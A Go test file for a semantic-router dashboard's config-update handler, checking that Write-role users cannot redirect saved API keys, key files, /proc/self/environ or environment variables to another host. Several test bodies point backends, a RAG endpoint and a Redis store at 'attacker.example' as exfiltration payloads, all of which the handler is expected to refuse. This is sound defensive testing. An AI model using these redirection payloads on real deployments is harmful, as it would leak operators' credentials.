package handlers

import (
	"bytes"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"testing"

	"github.com/vllm-project/semantic-router/dashboard/backend/auth"
)

// postConfig saves body through the config editor. A request with no session
// may not read configuration secrets, as a Write-role user may not; perms are
// the session's permissions otherwise.
func postConfig(t *testing.T, configPath string, body map[string]interface{}, perms ...string) *httptest.ResponseRecorder {
	t.Helper()
	data, err := json.Marshal(body)
	if err != nil {
		t.Fatal(err)
	}
	request := httptest.NewRequest(http.MethodPost, "/api/router/config/update", bytes.NewReader(data))
	if len(perms) > 0 {
		granted := map[string]bool{}
		for _, perm := range perms {
			granted[perm] = true
		}
		request = request.WithContext(auth.WithAuthContext(request.Context(), auth.AuthContext{Perms: granted}))
	}
	response := httptest.NewRecorder()
	UpdateConfigHandler(configPath, false, filepath.Dir(configPath))(response, request)
	return response
}

// asSecretReader serves handler's requests as from a user who may read
// configuration secrets, as an admin may, so a save may name any credential
// reference.
func asSecretReader(handler http.HandlerFunc) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		handler(w, r.WithContext(auth.WithAuthContext(r.Context(), auth.AuthContext{Perms: map[string]bool{auth.PermConfigSecretsRead: true}})))
	}
}

// backendBody is the saved config with fields set on its backend at
// endpoint, then the extra backends.
func backendBody(endpoint string, fields map[string]interface{}, extra ...map[string]interface{}) map[string]interface{} {
	body := canonicalConfigBody(endpoint)
	body["global"] = map[string]interface{}{}
	model := body["providers"].(map[string]interface{})["models"].([]map[string]interface{})[0]
	refs := model["backend_refs"].([]map[string]interface{})
	for field, value := range fields {
		refs[0][field] = value
	}
	model["backend_refs"] = append(refs, extra...)
	return body
}

func replicaBackend(endpoint string, fields map[string]interface{}) map[string]interface{} {
	backend := map[string]interface{}{"name": "endpoint2", "provider": "vllm", "endpoint": endpoint, "protocol": "http", "weight": 1}
	for field, value := range fields {
		backend[field] = value
	}
	return backend
}

func keyFile(path string) map[string]interface{} {
	return map[string]interface{}{"auth": map[string]interface{}{"api_key_file": path}}
}

func requireUnchangedFile(t *testing.T, path string, before []byte) {
	t.Helper()
	after, err := os.ReadFile(path)
	if err != nil || !bytes.Equal(before, after) {
		t.Fatalf("%s changed (%v):\n%s", path, err, after)
	}
}

// A Write-role user sees a key file's path, never the key, so moving the
// backend that names it would send the key to a host of their choosing.
func TestAWriterCannotSendASavedKeyToAnotherHost(t *testing.T) {
	configPath := createValidTestConfig(t, t.TempDir())
	saveConfigWithBackendKey(t, configPath, providerKeyFixture)
	path := savedKeyFile(t, configPath, providerKeyFixture)
	before, err := os.ReadFile(configPath)
	if err != nil {
		t.Fatal(err)
	}

	moved := backendBody("attacker.example:8000", keyFile(path))
	for _, test := range []struct {
		name string
		body map[string]interface{}
	}{
		{"moved", moved},
		{"named by a new backend", backendBody("127.0.0.1:8000", keyFile(path), replicaBackend("attacker.example:8000", keyFile(path)))},
	} {
		if response := postConfig(t, configPath, test.body); response.Code != http.StatusForbidden {
			t.Fatalf("%s: status = %d, want 403: %s", test.name, response.Code, response.Body.String())
		}
		requireUnchangedFile(t, configPath, before)
	}

	if response := postConfig(t, configPath, backendBody("127.0.0.1:8000", keyFile(path))); response.Code != http.StatusOK {
		t.Fatalf("a save that keeps the backend where it was: status = %d: %s", response.Code, response.Body.String())
	}
	if response := postConfig(t, configPath, moved, auth.PermConfigSecretsRead); response.Code != http.StatusOK {
		t.Fatalf("a user who may read secrets: status = %d: %s", response.Code, response.Body.String())
	}
}

// Nor can a Write-role user name a key file the config does not use: the
// Router would send whatever it reads there, another key included.
func TestAWriterCannotNameAKeyFileTheConfigDoesNotUse(t *testing.T) {
	configPath := createValidTestConfig(t, t.TempDir())
	saveConfigWithBackendKey(t, configPath, providerKeyFixture)
	path := savedKeyFile(t, configPath, providerKeyFixture)
	before, err := os.ReadFile(configPath)
	if err != nil {
		t.Fatal(err)
	}
	unnamed := filepath.Join(filepath.Dir(path), "key-earlier")
	outside := filepath.Join(t.TempDir(), "other.key")
	for _, file := range []string{unnamed, outside} {
		if err = os.WriteFile(file, []byte("sk-other-secret"), 0o600); err != nil {
			t.Fatal(err)
		}
	}

	for _, file := range []string{unnamed, outside, "/proc/self/environ"} {
		if response := postConfig(t, configPath, backendBody("127.0.0.1:8000", keyFile(file))); response.Code != http.StatusForbidden {
			t.Fatalf("%s: status = %d, want 403: %s", file, response.Code, response.Body.String())
		}
		requireUnchangedFile(t, configPath, before)
	}
	if response := postConfig(t, configPath, backendBody("127.0.0.1:8000", keyFile(outside)), auth.PermConfigSecretsRead); response.Code != http.StatusOK {
		t.Fatalf("a user who may read secrets: status = %d: %s", response.Code, response.Body.String())
	}
}

// On Kubernetes a save moves a typed key into the chart's key Secret and names
// its variable, which the Write role sees as plainly as a key file's path.
// Moving a backend that names one is refused the same way.
func TestAWriterCannotSendAnEnvironmentKeyToAnotherHost(t *testing.T) {
	configPath := createValidTestConfig(t, t.TempDir())
	for name, fields := range map[string]map[string]interface{}{
		"auth.api_key_env": {"auth": map[string]interface{}{"api_key_env": "VSR_KEY_TEST"}},
		"${NAME} api_key":  {"api_key": "${VSR_KEY_TEST}"},
	} {
		if response := postConfig(t, configPath, backendBody("127.0.0.1:8000", fields), auth.PermConfigSecretsRead); response.Code != http.StatusOK {
			t.Fatalf("%s: an admin save: status = %d: %s", name, response.Code, response.Body.String())
		}
		before, err := os.ReadFile(configPath)
		if err != nil {
			t.Fatal(err)
		}
		if response := postConfig(t, configPath, backendBody("attacker.example:8000", fields)); response.Code != http.StatusForbidden {
			t.Fatalf("%s moved: status = %d, want 403: %s", name, response.Code, response.Body.String())
		}
		requireUnchangedFile(t, configPath, before)
		if response := postConfig(t, configPath, backendBody("127.0.0.1:8000", fields)); response.Code != http.StatusOK {
			t.Fatalf("%s kept in place: status = %d: %s", name, response.Code, response.Body.String())
		}
	}
}

// The Router expands every variable of its own environment, so a variable
// the operator wrote, or $HOME, is a key like any other: a writer may not name
// one in a credential, nor move a block that names one.
func TestAWriterCannotSendAnOperatorVariableToAnotherHost(t *testing.T) {
	configPath := createValidTestConfig(t, t.TempDir())
	before, err := os.ReadFile(configPath)
	if err != nil {
		t.Fatal(err)
	}
	for name, body := range map[string]map[string]interface{}{
		"${OPENAI_API_KEY} on a new backend": backendBody("127.0.0.1:8000", nil, replicaBackend("203.0.113.7:8000", map[string]interface{}{"api_key": "${OPENAI_API_KEY}"})),
		"api_key_env: HOME on another host":  backendBody("attacker.example:8000", map[string]interface{}{"auth": map[string]interface{}{"api_key_env": "HOME"}}),
		"a header with a default":            backendBody("attacker.example:8000", map[string]interface{}{"headers": map[string]interface{}{"X-Key": "Bearer ${OPENAI_API_KEY:-none}"}}),
	} {
		if response := postConfig(t, configPath, body); response.Code != http.StatusForbidden {
			t.Fatalf("%s: status = %d, want 403: %s", name, response.Code, response.Body.String())
		}
		requireUnchangedFile(t, configPath, before)
	}

	stored := operatorCredentials("127.0.0.1", "search.internal", "redis.internal")
	if response := postConfig(t, configPath, stored, auth.PermConfigSecretsRead); response.Code != http.StatusOK {
		t.Fatalf("an admin save: status = %d: %s", response.Code, response.Body.String())
	}
	if before, err = os.ReadFile(configPath); err != nil {
		t.Fatal(err)
	}
	for name, body := range map[string]map[string]interface{}{
		"the backends":                  operatorCredentials("attacker.example", "search.internal", "redis.internal"),
		"the RAG plugin's api_key":      operatorCredentials("127.0.0.1", "attacker.example", "redis.internal"),
		"the response store's password": operatorCredentials("127.0.0.1", "search.internal", "attacker.example"),
	} {
		if response := postConfig(t, configPath, body); response.Code != http.StatusForbidden {
			t.Fatalf("moving %s: status = %d, want 403: %s", name, response.Code, response.Body.String())
		}
		requireUnchangedFile(t, configPath, before)
	}
	if response := postConfig(t, configPath, stored); response.Code != http.StatusOK {
		t.Fatalf("a writer's save in place: status = %d: %s", response.Code, response.Body.String())
	}
}

// operatorCredentials is a config whose operator named a variable in each
// place a credential leaves the Router: a backend's api_key and another
// model's auth.api_key_env on backendHost, a RAG plugin's api_key sent to
// ragHost, and the response store's password sent to storeHost.
func operatorCredentials(backendHost, ragHost, storeHost string) map[string]interface{} {
	body := backendBody(backendHost+":8000", map[string]interface{}{"api_key": "${OPENAI_API_KEY}"})
	providers := body["providers"].(map[string]interface{})
	providers["models"] = append(providers["models"].([]map[string]interface{}), map[string]interface{}{
		"name":              "home-model",
		"provider_model_id": "home-model",
		"backend_refs":      []map[string]interface{}{replicaBackend(backendHost+":8001", map[string]interface{}{"auth": map[string]interface{}{"api_key_env": "HOME"}})},
	})
	decision := body["recipes"].([]map[string]interface{})[0]["decisions"].([]map[string]interface{})[0]
	decision["plugins"] = []map[string]interface{}{{"type": "context", "configuration": map[string]interface{}{
		"enabled": true,
		"sources": []map[string]interface{}{{
			"type":    "rag",
			"backend": "external_api",
			"match":   map[string]interface{}{"recall": map[string]interface{}{"method": "embedding", "top_k": 3}},
			"backend_config": map[string]interface{}{
				"endpoint":         "https://" + ragHost + "/query",
				"api_key":          "${SEARCH_API_KEY}",
				"request_format":   "custom",
				"request_template": `{"query":"{{.Query}}"}`,
			},
		}},
	}}}
	body["global"] = map[string]interface{}{"services": map[string]interface{}{"response_api": map[string]interface{}{
		"enabled":       true,
		"store_backend": "redis",
		"redis":         map[string]interface{}{"address": storeHost + ":6379", "password": "$REDIS_PASSWORD"},
	}}}
	return body
}

// The Router expands a variable in any value, not only a credential field, so
// a path, a header or a plugin prompt sends the value where the field is used.
// A writer may not add one, nor move a block that holds one, but may save in
// place.
func TestAWriterCannotSendAVariableFromAnyField(t *testing.T) {
	configPath := createValidTestConfig(t, t.TempDir())
	before, err := os.ReadFile(configPath)
	if err != nil {
		t.Fatal(err)
	}
	for name, body := range map[string]map[string]interface{}{
		"${OPENAI_API_KEY} in a new backend's chat_path": chatPathModelBody("127.0.0.1:8000", "/v1/${OPENAI_API_KEY}"),
		"${HOME} in a system prompt":                     systemPromptBody("Context: ${HOME}"),
	} {
		if response := postConfig(t, configPath, body); response.Code != http.StatusForbidden {
			t.Fatalf("%s: status = %d, want 403: %s", name, response.Code, response.Body.String())
		}
		requireUnchangedFile(t, configPath, before)
	}

	stored := variableConfig("127.0.0.1")
	if response := postConfig(t, configPath, stored, auth.PermConfigSecretsRead); response.Code != http.StatusOK {
		t.Fatalf("an admin save: status = %d: %s", response.Code, response.Body.String())
	}
	if before, err = os.ReadFile(configPath); err != nil {
		t.Fatal(err)
	}
	if response := postConfig(t, configPath, variableConfig("attacker.example")); response.Code != http.StatusForbidden {
		t.Fatalf("moving the backend's path: status = %d, want 403: %s", response.Code, response.Body.String())
	}
	requireUnchangedFile(t, configPath, before)
	if response := postConfig(t, configPath, stored); response.Code != http.StatusOK {
		t.Fatalf("a writer's save in place: status = %d: %s", response.Code, response.Body.String())
	}
}

// systemPromptBody is the saved config with a system_prompt plugin carrying
// prompt on its decision.
func systemPromptBody(prompt string) map[string]interface{} {
	body := canonicalConfigBody("127.0.0.1:8000")
	body["global"] = map[string]interface{}{}
	withSystemPrompt(body, prompt)
	return body
}

// chatPathModelBody adds a second model whose only backend, at endpoint,
// names a variable in chat_path.
func chatPathModelBody(endpoint, chatPath string) map[string]interface{} {
	body := canonicalConfigBody("127.0.0.1:8000")
	body["global"] = map[string]interface{}{}
	providers := body["providers"].(map[string]interface{})
	providers["models"] = append(providers["models"].([]map[string]interface{}), map[string]interface{}{
		"name":              "path-model",
		"provider_model_id": "path-model",
		"backend_refs":      []map[string]interface{}{replicaBackend(endpoint, map[string]interface{}{"chat_path": chatPath})},
	})
	return body
}

// variableConfig names a variable in a second model's chat_path on host and in
// a decision's system prompt, each a value the Router expands and sends on.
func variableConfig(host string) map[string]interface{} {
	body := chatPathModelBody(host+":8000", "/v1/${OPENAI_API_KEY}")
	withSystemPrompt(body, "Context: ${HOME}")
	return body
}

func withSystemPrompt(body map[string]interface{}, prompt string) {
	decision := body["recipes"].([]map[string]interface{})[0]["decisions"].([]map[string]interface{})[0]
	decision["plugins"] = []map[string]interface{}{{"type": "system_prompt", "configuration": map[string]interface{}{
		"enabled":       true,
		"system_prompt": prompt,
	}}}
}
